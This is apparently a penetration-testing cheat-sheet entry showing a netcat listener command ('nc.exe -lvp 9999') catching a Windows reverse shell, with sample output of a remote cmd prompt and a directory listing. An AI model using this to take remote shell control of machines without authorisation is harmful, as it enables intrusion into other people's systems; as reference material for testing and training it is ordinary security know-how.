---
id: 36f22fc1-1cb9-43be-86a9-df1a83188264
name: Netcat windows reverse shell is observed
type: command
executor: ''
data: 'nc.exe -lvp 9999 '
output: "Ncat: Version 7.80 ( https://nmap.org/ncat )\nNcat: Listening on :::9999\n\
  Ncat: Listening on 0.0.0.0:9999\nNcat: Connection from 192.168.11.7.\nNcat: Connection\
  \ from 192.168.11.7:56945.\nMicrosoft Windows [Version 10.0.17763.1339]\n(c) 2018\
  \ Microsoft Corporation. All rights reserved.\n\nC:\\Users\\mandav1x>dir\ndir\n\
  \ Volume in drive C is OSDisk\n Volume Serial Number is DC44-2984\n\n Directory\
  \ of C:\\Users\\mandav1x\n\n30-07-2020  21:23    <DIR>          .\n30-07-2020  21:23\
  \    <DIR>          ..\n19-06-2020  12:31    <DIR>          .cisco\n22-06-2020 \
  \ 18:36    <DIR>          .ghidra\n"
created_at: '2020-08-01T18:00:53.942987+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
tools:
- '[[Netcat]]'
- '[[Nmap]]'
- '[[dir]]'
---

# Netcat windows reverse shell is observed

```bash
nc.exe -lvp 9999 
```

## Expected Output

```
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::9999
Ncat: Listening on 0.0.0.0:9999
Ncat: Connection from 192.168.11.7.
Ncat: Connection from 192.168.11.7:56945.
Microsoft Windows [Version 10.0.17763.1339]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\mandav1x>dir
dir
 Volume in drive C is OSDisk
 Volume Serial Number is DC44-2984

 Directory of C:\Users\mandav1x

30-07-2020  21:23    <DIR>          .
30-07-2020  21:23    <DIR>          ..
19-06-2020  12:31    <DIR>          .cisco
22-06-2020  18:36    <DIR>          .ghidra

```


